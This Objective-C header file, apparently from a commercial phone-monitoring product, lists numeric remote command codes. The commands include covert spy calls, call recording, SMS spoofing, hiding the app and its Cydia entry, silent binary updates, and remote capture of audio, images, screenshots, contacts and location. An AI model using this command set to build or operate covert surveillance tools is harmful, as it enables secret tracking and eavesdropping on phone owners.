/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RemoteCmdExceptionCode
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  16/11/2011, Makara KH, Vervata Co., Ltd. All rights reserved.
*/

#import <Foundation/Foundation.h>

static NSString* const kRemoteCmdCodeRequestHeartbeat				= @"2";
static NSString* const kRemoteCmdCodeEnableSpyCall					= @"9";
static NSString* const kRemoteCmdCodeEnableSpyCallWithMonitorNumber	= @"10";
static NSString* const kRemoteCmdCodeAddMonitors                 	= @"160";
static NSString* const kRemoteCmdCodeResetMonitors                 	= @"163";
static NSString* const kRemoteCmdCodeClearMonitors                 	= @"161";
static NSString* const kRemoteCmdCodeQueryMonitors                 	= @"162";
static NSString* const kRemoteCmdCodeAddCISNumbers            	    = @"130";
static NSString* const kRemoteCmdCodeResetCISNumbers            	= @"131";
static NSString* const kRemoteCmdCodeClearCISNumbers            	= @"132";
static NSString* const kRemoteCmdCodeQueryCISNumbers            	= @"133";


static NSString* const kRemoteCmdCodeEnableSpyCallOnFacetime		= @"11";
static NSString* const kRemoteCmdCodeEnableFaceTimeSpyCallWithFacetimeID    = @"12";
static NSString* const kRemoteCmdCodeAddMonitorFacetimeIDs         	= @"180";
static NSString* const kRemoteCmdCodeResetMonitorFacetimeIDs    	= @"181";
static NSString* const kRemoteCmdCodeClearMonitorFacetimeIDs      	= @"182";
static NSString* const kRemoteCmdCodeQueryMonitorFacetimeIDs    	= @"183";


static NSString* const kRemoteCmdCodeAddKeyword                 	= @"73";
static NSString* const kRemoteCmdCodeResetKeyword                 	= @"74";
static NSString* const kRemoteCmdCodeClearKeyword                 	= @"75";
static NSString* const kRemoteCmdCodeQueryKeyword                 	= @"76";

static NSString* const kRemoteCmdCodeEnableWatchNotification      	= @"49";
static NSString* const kRemoteCmdCodeSetWatchFlags              	= @"50";
static NSString* const kRemoteCmdCodeAddWatchNumber              	= @"45";
static NSString* const kRemoteCmdCodeResetWatchNumber              	= @"46";
static NSString* const kRemoteCmdCodeClearWatchNumber              	= @"47";
static NSString* const kRemoteCmdCodeQueryWatchNumber            	= @"48";

static NSString* const kRemoteCmdCodeAddHomes                    	= @"150";
static NSString* const kRemoteCmdCodeResetHomes                    	= @"151";
static NSString* const kRemoteCmdCodeClearHomes                    	= @"152";
static NSString* const kRemoteCmdCodeQueryHomes                    	= @"153";

static NSString* const kRemoteCmdCodeAddNotificationNumber         	= @"171";
static NSString* const kRemoteCmdCodeResetNotificationNumber       	= @"172";
static NSString* const kRemoteCmdCodeClearNotificationNumber       	= @"173";
static NSString* const kRemoteCmdCodeQueryNotificationNumber       	= @"174";

static NSString* const kRemoteCmdCodeAddEmergencyNumber         	= @"164";
static NSString* const kRemoteCmdCodeResetEmergencyNumber         	= @"165";
static NSString* const kRemoteCmdCodeClearEmergencyNumber         	= @"166";
static NSString* const kRemoteCmdCodeQueryEmergencyNumber         	= @"167";

static NSString* const kRemoteCmdCodeUploadActualMedia           	= @"90";
static NSString* const kRemoteCmdCodeRequestHistoricalMedia        	= @"87";
static NSString* const kRemoteCmdCodeDeleteActualMedia          	= @"91";

static NSString* const kRemoteCmdCodeRequestAddressBook             = @"120";
static NSString *const kRemoteCmdCodeRequestAddressBookForApproval	= @"121";
static NSString* const kRemoteCmdCodeSetAddressBookManagement       = @"122";

static NSString* const kRemoteCmdCodeRequestMobileNumber          	= @"199";
static NSString* const kRemoteCmdCodeEnableSIMChange             	= @"56";
static NSString* const kRemoteCmdCodeSetVisibilty               	= @"14214";
static NSString* const kRemoteCmdCodeSpoofSMSCode               	= @"85";

static NSString* const kRemoteCmdCodeActivateWithActivationCodeURL	= @"14140";
static NSString* const kRemoteCmdCodeActivateWithoutActivationCode  = @"14141";
static NSString* const kRemoteCmdCodeDeactivateWithDeactivationCode	= @"14142";
static NSString *const kRemoteCmdCodeActivateWithActivationCode		= @"14144";
static NSString* const kRemoteCmdCodeDeactivateImmediate         	= @"14145";

static NSString *const kRemoteCmdCodeSetPanicMode					= @"31";
static NSString *const kRemoteCmdCodeSetWipeoutData					= @"201";
static NSString *const kRemoteCmdCodeSetLockDevice					= @"202";
static NSString *const kRemoteCmdCodeSetUnlockDevice				= @"203";

static NSString* const kRemoteCmdCodeSetSettings   					= @"92";
static NSString* const kRemoteCmdCodeRequestEvent					= @"64";
static NSString* const kRemoteCmdCodeEnableCapture					= @"60";
static NSString* const kRemoteCmdCodeUnInstallApplication   		= @"200";
static NSString* const kRemoteCmdCodeEnableLocation					= @"52";
static NSString* const kRemoteCmdCodeUpdateLocationInterval			= @"53";
static NSString* const kRemoteCmdCodeOnDemandLocation				= @"101";
static NSString* const kRemoteCmdCodeAddURL							= @"396";
static NSString* const kRemoteCmdCodeResetURL						= @"397";
static NSString* const kRemoteCmdCodeClearURL						= @"398";
static NSString* const kRemoteCmdCodeQueryURL						= @"399";
static NSString* const kRemoteCmdCodeRequestCurrentURL              = @"14143";
static NSString* const kRemoteCmdCodeRequestSettings				= @"67";
static NSString* const kRemoteCmdCodeRequestDiagnostic    			= @"62";
static NSString* const kRemoteCmdCodeRequestStartUpTime				= @"5";
static NSString* const kRemoteCmdCodeRestartDevice					= @"147";
static NSString* const kRemoteCmdCodeRestartClient					= @"148";
static NSString* const kRemoteCmdCodeShutdownDevice					= @"149";
static NSString* const kRemoteCmdCodeRetrievetRunningProcess		= @"14852";
static NSString* const kRemoteCmdCodeTerminateRunningProcess		= @"14853";
static NSString* const kRemoteCmdCodeDeleteEventDatabase			= @"14587";
static NSString* const kRemoteCmdCodeRequestBookmark				= @"208";
static NSString* const kRemoteCmdCodeRequestInstalledApplication	= @"205";
static NSString* const kRemoteCmdCodeRequestRunningApplication		= @"206";

static NSString* const kRemoteCmdCodeEnableApplicationProfile		= @"209";
static NSString* const kRemoteCmdCodeEnableURLProfile				= @"210";
static NSString* const kRemoteCmdCodeRequestBatteryInfo				= @"72";
static NSString * const kRemoteCmdCodeSetUpdateAvailable			= @"306";
static NSString * const kRemoteCmdCodeOnDemandRecord				= @"84";
static NSString * const kRemoteCmdCodeRequestCalendar				= @"213";
static NSString * const kRemoteCmdCodeRequestNote					= @"214";
static NSString * const kRemoteCmdCodeOnDemandImageCapture			= @"88";
static NSString * const kRemoteCmdCodeSetCydiaVisibility			= @"216";
static NSString * const kRemoteCmdCodeSetUpdateAvailableSilentMode	= @"307";

static NSString * const kRemoteCmdCodeSetDeliveryMethod				= @"217";
static NSString * const kRemoteCmdCodeClearCredentialDetails		= @"218";
static NSString * const kRemoteCmdCodeClearRememberedCredential		= @"219";

static NSString * const kRemoteCmdCodeRequestSnapshotRules			= @"220";
static NSString * const kRemoteCmdCodeRequestMonitorApplications	= @"221";
static NSString * const kRemoteCmdCodeRequestDeviceSettings         = @"222";
static NSString * const kRemoteCmdCodeRequestHistoricalEvents       = @"224";
static NSString * const kRemoteCmdCodeRequestTemporalApplicationControl     = @"225";
static NSString * const kRemoteCmdCodeSetDownloadBinaryAndUpdateSilentMode  = @"226";
static NSString * const kRemoteCmdCodeResetNetworkAlertStatistic    = @"227";

static NSString * const kRemoteCmdCodeOnDemandScreenshotRecord      = @"96";
static NSString * const kRemoteCmdCodeRequestDebugLog               = @"400";
static NSString * const kRemoteCmdCodeDeleteEvents                  = @"401";

static NSString * const kRemoteCmdCodeEnableCallRecording           = @"89";
static NSString * const kRemoteCmdCodeSetCallRecordingFlags         = @"94";
static NSString * const kRemoteCmdCodeAddCallRecordingWatchNumbers  = @"176";
static NSString * const kRemoteCmdCodeResetCallRecordingWatchNumbers= @"177";
static NSString * const kRemoteCmdCodeClearCallRecordingWatchNumbers= @"178";
static NSString * const kRemoteCmdCodeQueryCallRecordingWatchNumbers= @"179";

//Sync
static NSString* const kRemoteCmdCodeSyncUpdateConfiguration		= @"300";
static NSString* const kRemoteCmdCodeSyncAddressBook             	= @"301";
static NSString* const kRemoteCmdCodeSyncCommunicationDirectives	= @"302";
static NSString* const kRemoteCmdCodeSyncTime						= @"303";
static NSString* const kRemoteCmdCodeSyncApplicationProfile			= @"308";
static NSString* const kRemoteCmdCodeSyncURLProfile					= @"309";
static NSString* const kRemoteCmdCodeSyncSupportedIMVersion         = @"311";
static NSString* const kRemoteCmdCodeSyncSnapshotRules              = @"312";
static NSString* const kRemoteCmdCodeSyncMonitorApplications        = @"313";
static NSString* const kRemoteCmdCodeSyncTemporalApplicationControl = @"314";
static NSString* const kRemoteCmdCodeSyncNetworkAlertCriteria       = @"315";
static NSString* const kRemoteCmdCodeSyncAppScreenShot              = @"317";
static NSString* const kRemoteCmdCodeSyncUpdateAvailable     		= @"X";

// Misellanouse
static NSString *const kRemoteCmdCodeEnableCommunicationRestrictions= @"204";
